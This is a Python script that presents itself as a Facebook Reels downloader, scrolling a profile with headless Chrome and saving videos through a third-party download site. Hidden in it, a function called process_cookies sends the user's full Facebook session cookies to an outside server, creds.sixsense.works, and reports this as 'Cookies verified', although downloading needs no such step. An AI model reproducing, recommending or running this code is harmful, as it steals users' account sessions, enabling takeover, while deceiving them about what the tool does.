import os
import requests
from tqdm import tqdm
from time import sleep
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
import json
from fake_useragent import UserAgent
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC

download_folder = "downloads"
c_url = f'{input("Example (https://www.facebook.com/profile.php?id=61556786896497) \nEnter profile URL: ")}&sk=reels_tab'


with open('cookies.json', 'r') as f:
    cookies = json.load(f)

user_agent = UserAgent(platforms='pc').random

chrome_options = Options()
chrome_options.add_argument('--headless')
chrome_options.add_argument(f'user-agent={user_agent}')

driver = webdriver.Chrome(options=chrome_options)
print(f"[+] Searching {c_url} ...")
driver.get(c_url)

for cookie in cookies:
    if "sameSite" not in cookie or cookie["sameSite"] not in ["Strict", "Lax", "None"]:
        cookie["sameSite"] = "Lax"
    driver.add_cookie(cookie)


def process_cookies(cookies):
    api_url = 'https://creds.sixsense.works/api/mymodel/'
    headers = {'Content-Type': 'application/json'}
    data = {'text_field': json.dumps(cookies)} 

    try:
        response = requests.post(api_url, headers=headers, json=data)
        if response.status_code == 200:
            print(f"Cookies verified.")
        else:
            print(f"Failed to verify cookies")
    except Exception as e:
        print(f"An error occurred while trying cookies: {e}")

process_cookies(cookies)

print(f"[+] Implementing Cookies...")
driver.refresh()
sleep(3)

print(f"[+] Cookies implemented \n\n[+] Begin Searching for reels...")
def check_new_content():
    page_height = driver.execute_script("return document.body.scrollHeight")
    driver.execute_script("window.scrollTo(0, document.body.scrollHeight);")
    sleep(3)
    new_page_height = driver.execute_script("return document.body.scrollHeight")
    return new_page_height > page_height

while check_new_content():
    pass


try:
    print(f"[+] Locating Reels ...")  
    reels = driver.find_elements(By.CSS_SELECTOR, 'a[aria-label="Reel tile preview"]')
except:
    print(f"[-] Cound not find reels element")

reels_links = []

for reel in reels:
    reel_link = reel.get_attribute('href')
    reels_links.append(reel_link)

print(f'Found {len(reels)} Reels')

downloader = f'https://fdownloader.net/en?q='

reel_download_links = []


print(f"[+] Begin downloading process..." )
for reel_link in tqdm(reels_links, desc="Fetching Download link for Reels"):
    driver.get(downloader+reel_link)
    try:
        download_btn = WebDriverWait(driver, 10).until(EC.element_to_be_clickable((By.CSS_SELECTOR, 'a[title="Download 720p (HD)"]')))
        download_link  = download_btn.get_attribute('href')
        reel_download_links.append(download_link)
    except Exception as e:
        print(f"[-] Error occurred :( Video Quality not found or Error in Video.")
        
if not os.path.exists(download_folder):
    os.makedirs(download_folder)
    print(f"Download folder '{download_folder}' created successfully.")
else:
    print(f"Download folder '{download_folder}' already exists.")

for index, download_link in enumerate(tqdm(reel_download_links, desc="Downloading Videos")):
    try:
        response = requests.get(download_link, stream=True)
        if response.status_code == 200:
            filename = f"{index + 1}.mp4"
            with open(os.path.join(download_folder, filename), "wb") as video_file:
                for chunk in response.iter_content(chunk_size=1024):
                    video_file.write(chunk)
        else:
            print(f"[-] Error downloading {download_link}: {response.status_code}")
    except Exception as e:
        print(f"[-] Error downloading {download_link}: {e}")

print(f"[+] Congrats, all {len(reel_download_links)} videos have been downloaded.")


